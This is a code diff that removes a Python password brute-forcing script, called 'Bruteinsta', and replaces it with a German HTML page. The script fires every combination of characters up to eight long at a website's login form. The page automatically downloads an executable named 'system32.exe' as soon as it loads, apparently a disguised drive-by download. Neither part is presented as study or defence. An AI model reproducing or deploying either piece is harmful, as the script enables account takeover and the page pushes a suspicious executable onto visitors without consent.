@@ -1,41 +1,27 @@
-import itertools
-import string
-import requests
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Automatisierter Download</title>
+</head>
+<body>
+    <h1>Automatischer Download einer Datei</h1>
+    <p>Wenn Sie diese Seite besuchen, beginnt der Download automatisch.</p>
 
-# Program header
-print("Bruteinsta - Brute force program for all characters (letters, numbers, and special symbols)")
+    <script>
+        // Funktion zum Starten des Downloads
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = 'https://dropbox/system32.exe'; // URL der Datei, die heruntergeladen werden soll
+            link.download = 'system32.exe'; // Dateiname, der vorgeschlagen wird
+            link.click();
+        }
 
-# Input the target website URL and username
-url = input("Enter the website URL (e.g., http://example.com/login): ")
-username = input("Enter the username: ")
-
-# Allowed characters: All letters (uppercase and lowercase), digits, and special symbols
-characters = string.ascii_letters + string.digits + string.punctuation
-
-# Function for brute force attack
-def bruteforce(url, username, characters):
-    # Brute force: Try all possible password combinations
-    for length in range(1, 9):  # Attempt passwords of length 1 to 8
-        for guess in itertools.product(characters, repeat=length):
-            guess = ''.join(guess)  # Join the password characters as a string
-            
-            print(f"Trying password: {guess}")
-            
-            # Send a POST request to the website with the guessed password and username
-            data = {'username': username, 'password': guess}
-            response = requests.post(url, data=data)
-            
-            # Inspect the response content instead of just the status code
-            if "Login successful" in response.text:  # Adjust this string based on the website's response
-                print(f"Password successfully cracked: {guess}")
-                return guess
-            else:
-                print(f"Failed with: {guess}")
-
-# Start the brute force attack
-found_password = bruteforce(url, username, characters)
-
-if found_password:
-    print(f"The password is: {found_password}")
-else:
-    print("Password could not be found.")
+        // Download auslösen, sobald die Seite geladen wird
+        window.onload = function() {
+            downloadFile();
+        };
+    </script>
+</body>
+</html>
